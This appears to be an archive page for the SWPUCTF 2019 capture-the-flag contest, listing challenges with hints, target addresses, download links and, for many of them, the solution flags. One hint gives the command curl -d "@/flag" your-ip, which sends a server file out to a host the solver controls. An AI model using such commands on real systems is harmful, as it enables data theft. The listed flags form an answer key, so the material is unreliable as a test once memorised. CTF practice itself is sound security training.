## 比赛信息

动态分数



## Writeup

[swpuctf2019 p1KkHeap 详细题解](https://blog.csdn.net/seaaseesa/article/details/103450524)



## 附件链接

链接：https://pan.baidu.com/s/1-dreAG9ysc7KNNLZLccphg 提取码：hdxw

链接：https://share.weiyun.com/ekkctlWx 密码：20j5uk

外链:https://t1m.lanzous.com/b0aet0rwd 密码:hdxw



## WEB

### easy_web(317.35pt,42solved)

> hint1：不是xss || hint2：使用somd5解flag
> URL http://211.159.177.185:23456



### python简单题(373.84pt,32solved)

> 快速获取flag: curl -d "@/flag" your-ip
> URL http://114.67.109.247:2333



### easy_python(556.09pt,13solved)

> 不需要扫描器 || 描述：python 环境 3.5.2
> URL http://47.101.36.165:7777




### demo_mvc(820.35pt,3solved)

> 无需扫描 hint:PDO::query
> URL http://182.92.220.157:11116



### FFFFF(1000pt,0solved)

> 不需要爆破噻 || jdk8的xxe有点不一样
> URL http://39.98.64.24:25531/ctffffff/backups/




### 出题人不知道(880.7pt,2solved)

> wsdl.php
> URL http://132.232.75.90/

```xml
This XML file does not appear to have any style information associated with it. The document tree is shown below.
<definitions xmlns:wsdl="http://schemas.xmlsoap.org/wsdl/" xmlns:soap="http://schemas.xmlsoap.org/wsdl/soap/" xmlns:tns="urn:soap" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:SOAP-ENC="http://schemas.xmlsoap.org/soap/encoding/" xmlns="http://schemas.xmlsoap.org/wsdl/" name="soap" targetNamespace="urn:soap">
<types xmlns="http://schemas.xmlsoap.org/wsdl/"/>
<portType name="soapPort">
<operation name="index">
<input message="tns:indexRequest"/>
<output message="tns:indexResponse"/>
</operation>
<operation name="login">
<input message="tns:loginRequest"/>
<output message="tns:loginResponse"/>
</operation>
<operation name="set_cookie">
<input message="tns:set_cookieRequest"/>
<output message="tns:set_cookieResponse"/>
</operation>
<operation name="user">
<input message="tns:userRequest"/>
<output message="tns:userResponse"/>
</operation>
<operation name="check">
<input message="tns:checkRequest"/>
<output message="tns:checkResponse"/>
</operation>
<operation name="File_read">
<input message="tns:File_readRequest"/>
<output message="tns:File_readResponse"/>
</operation>
<operation name="hint">
<input message="tns:hintRequest"/>
<output message="tns:hintResponse"/>
</operation>
<operation name="Get_flag">
<input message="tns:Get_flagRequest"/>
<output message="tns:Get_flagResponse"/>
</operation>
</portType>
<binding name="soapBinding" type="tns:soapPort">
<soap:binding style="rpc" transport="http://schemas.xmlsoap.org/soap/http"/>
<operation name="index">
<soap:operation soapAction="urn:soap#Service#index"/>
<input>
<soap:body use="encoded" namespace="urn:soap" encodingStyle="http://schemas.xmlsoap.org/soap/encoding/"/>
</input>
<output>
<soap:body use="encoded" namespace="urn:soap" encodingStyle="http://schemas.xmlsoap.org/soap/encoding/"/>
</output>
</operation>
<operation name="login">
<soap:operation soapAction="urn:soap#Service#login"/>
<input>
<soap:body use="encoded" namespace="urn:soap" encodingStyle="http://schemas.xmlsoap.org/soap/encoding/"/>
</input>
<output>
<soap:body use="encoded" namespace="urn:soap" encodingStyle="http://schemas.xmlsoap.org/soap/encoding/"/>
</output>
</operation>
<operation name="set_cookie">
<soap:operation soapAction="urn:soap#Service#set_cookie"/>
<input>
<soap:body use="encoded" namespace="urn:soap" encodingStyle="http://schemas.xmlsoap.org/soap/encoding/"/>
</input>
<output>
<soap:body use="encoded" namespace="urn:soap" encodingStyle="http://schemas.xmlsoap.org/soap/encoding/"/>
</output>
</operation>
<operation name="user">
<soap:operation soapAction="urn:soap#Service#user"/>
<input>
<soap:body use="encoded" namespace="urn:soap" encodingStyle="http://schemas.xmlsoap.org/soap/encoding/"/>
</input>
<output>
<soap:body use="encoded" namespace="urn:soap" encodingStyle="http://schemas.xmlsoap.org/soap/encoding/"/>
</output>
</operation>
<operation name="check">
<soap:operation soapAction="urn:soap#Service#check"/>
<input>
<soap:body use="encoded" namespace="urn:soap" encodingStyle="http://schemas.xmlsoap.org/soap/encoding/"/>
</input>
<output>
<soap:body use="encoded" namespace="urn:soap" encodingStyle="http://schemas.xmlsoap.org/soap/encoding/"/>
</output>
</operation>
<operation name="File_read">
<soap:operation soapAction="urn:soap#Service#File_read"/>
<input>
<soap:body use="encoded" namespace="urn:soap" encodingStyle="http://schemas.xmlsoap.org/soap/encoding/"/>
</input>
<output>
<soap:body use="encoded" namespace="urn:soap" encodingStyle="http://schemas.xmlsoap.org/soap/encoding/"/>
</output>
</operation>
<operation name="hint">
<soap:operation soapAction="urn:soap#Service#hint"/>
<input>
<soap:body use="encoded" namespace="urn:soap" encodingStyle="http://schemas.xmlsoap.org/soap/encoding/"/>
</input>
<output>
<soap:body use="encoded" namespace="urn:soap" encodingStyle="http://schemas.xmlsoap.org/soap/encoding/"/>
</output>
</operation>
<operation name="Get_flag">
<soap:operation soapAction="urn:soap#Service#Get_flag"/>
<input>
<soap:body use="encoded" namespace="urn:soap" encodingStyle="http://schemas.xmlsoap.org/soap/encoding/"/>
</input>
<output>
<soap:body use="encoded" namespace="urn:soap" encodingStyle="http://schemas.xmlsoap.org/soap/encoding/"/>
</output>
</operation>
</binding>
<service name="soap">
<documentation/>
<port name="soapPort" binding="tns:soapBinding">
<soap:address location="http://127.0.0.1:80/xiaosai/create.php"/>
</port>
</service>
<message name="indexRequest"></message>
<message name="indexResponse">
<part name="index" type="xsd:string"/>
</message>
<message name="loginRequest">
<part name="username" type="xsd:string"/>
<part name="passwd" type="xsd:string"/>
</message>
<message name="loginResponse">
<part name="login" type="xsd:string"/>
</message>
<message name="set_cookieRequest">
<part name="securityfile" type="xsd:string"/>
<part name="contents" type="xsd:string"/>
</message>
<message name="set_cookieResponse">
<part name="set_cookie" type="xsd:string"/>
</message>
<message name="userRequest"></message>
<message name="userResponse">
<part name="user" type="xsd:string"/>
</message>
<message name="checkRequest">
<part name="securityfile" type="xsd:string"/>
</message>
<message name="checkResponse">
<part name="check" type="xsd:string"/>
</message>
<message name="File_readRequest">
<part name="filename" type="xsd:string" value="keyaaaaaaaasdfsaf.txt"/>
</message>
<message name="File_readResponse">
<part name="File_read" type="xsd:string"/>
</message>
<message name="hintRequest">
<part name="few_file" type="xsd:string"/>
</message>
<message name="hintResponse">
<part name="hint" type="xsd:string"/>
</message>
<message name="Get_flagRequest"></message>
<message name="Get_flagResponse">
<part name="Get_flag" type="xsd:string"/>
</message>
</definitions>
```



## REVERSE

### easyRE(556.09pt,13solved)

> 链接：https://pan.baidu.com/s/1qqJRkDFbCdzTpT_lgdcu6g 提取码：l16o || hint1：看二进制首尾变化
> URL https://pan.baidu.com/s/1qqJRkDFbCdzTpT_lgdcu6g

附件下载：easyRE.exe

```
swpuctf{we18-l8co-m1e4-58to-swpu}
```



### ReverseMe(627.3pt,9solved)

> 链接：https://pan.baidu.com/s/1jUU9_cjIkA6I0l-xzJQM6Q 提取码：fyaf flag格式为：flag{xxx}
> URL https://pan.baidu.com/s/1jUU9_cjIkA6I0l-xzJQM6Q

附件下载：ReverseMe.exe

```
swpuctf{y0u_@re_s0_coo1}
```



### RE2(702.6pt,6solved)

> 链接：https://pan.baidu.com/s/1m5MjuvcFbffKPF2vOe0eag 提取码：j49h
> URL https://pan.baidu.com/s/1m5MjuvcFbffKPF2vOe0eag

附件下载：EasiestRe.exe

```
flag{Y0uaretheB3st!#@_VirtualCC}
```




### RE4(1000pt,0solved)

> 提取码：wy7e || flag格式swpuctf{xxx} || 找找消息发送，不能动调就静态看看
> URL https://pan.baidu.com/s/1sYpUw7PWcPOf9FEotfo5Ew


附件下载：RE1（解压：123）忽略报毒.zip

```
a21xcas591sdaosu2jsos
```



## MISC

### 神奇的二维码(52.12pt,147solved)

> 啥也不说了，扫码支付获取flag^_^ || hint1：flag全是小写
> URL https://pan.baidu.com/s/1mFYIJXwOAM9AoSUwmHHdNQ

附件下载：BitcoinPay.png

```
swpuctf{morseisveryveryeasy}
```



### 漂流的马里奥(10pt,179solved)

> 链接：https://pan.baidu.com/s/1Bj2LJMNwSch-cKMK56K9hg 提取码：d3fp
> URL https://pan.baidu.com/s/1Bj2LJMNwSch-cKMK56K9hg

附件下载：easy_misc.zip

```
swupctf{ddg_is_cute}
```



### 伟大的侦探(260.86pt,55solved)

> 链接：https://pan.baidu.com/s/1JaMbDl0efPPsGKxA7x3ULw 提取码：9zcf || hint1：压缩包密码解码之后最后一位是! || hint2：flag没有空格，格式为swpuctf{}
> URL https://pan.baidu.com/s/1JaMbDl0efPPsGKxA7x3ULw

附件下载：misc.zip

```
乱码恢复：wllm_is_the_best_team!
swpuctf{iloveholmesandwllm}
```

参考链接：http://www.tuilixy.net/thread-82619-1-1.html



### 你有没有好好看网课？(441.66pt,23solved)

> https://pan.baidu.com/s/10aXg8SrgyhQqeceBbD3tZg 提取码：078j
> hint1：word文档很重要
> hint2：工具也许是某种视频剪辑工具
> hint3：word文档中的数字很重要
> hint4: 压缩包密码都是小写
> hint5: word文档中的数字 对应视频中的时间段
> URL https://pan.baidu.com/s/10aXg8SrgyhQqeceBbD3tZg

附件下载：flag1.zip

解压密码183792



### Network(152.09pt,92solved)

> 链接：https://pan.baidu.com/s/1MKlcjLakWYDjk1B8G1OquQ 提取码：gx4l || 描述：flag格式为flag{} || hint：ttl || hint2：伪加密
> URL https://pan.baidu.com/s/1MKlcjLakWYDjk1B8G1OquQ

附件下载：t.zip

```
flag{189ff9e5b743ae95f940a6ccc6dbd9ab}
```

参考链接：https://www.jianshu.com/p/c14970447ddd#奇怪的TTL字段



## Mobile

### easyapp(460.16pt,21solved)

> 仅可在x86环境下运行
> URL https://pan.baidu.com/s/196fdtTV3XSlNt86XSi7O0g

附件下载：app1.apk



### ThousandYearsAgo(820.35pt,3solved)

> 听说这是一个可以一键获取flag的应用哦~ || hint1：注意字符串在哪里调用 || 不是md5 || 加密函数第二个参数为5
> URL https://pan.baidu.com/s/1ZkdZL3LEHHW9SxOTVEBuIw

附件下载：app2.apk



### 小小ctf(702.6pt,6solved)

> 百度网盘：https://pan.baidu.com/share/init?surl=LGHqv8-pUunV4bREmTggbA 提取码：q2eu
> URL https://pan.baidu.com/share/init?surl=LGHqv8-pUunV4bREmTggbA

附件下载：app-release.apk



## PWN

### p1KkHeap(502.79pt,17solved)

> 链接：https://share.weiyun.com/5WBqv4K 密码：5pge4w || nc 39.98.64.24 9091 || 题目描述：p1KkHeap Go Go Go! It is easy for you. flag的位置为./flag.txt
> URL https://share.weiyun.com/5WBqv4K

附件下载：swpuctf_pwn_p1KkHeap.zip



### Login(480.42pt,19solved)

> 链接：https://share.weiyun.com/51jKZMJ 密码：7gbc5b || 地址：108.160.139.79:9090 || 来都来啦！做道题再走吧~ || 题目是ubuntu16编译，docker环境是18
> URL https://share.weiyun.com/51jKZMJ

附件下载：swpuctf_pwn_login.zip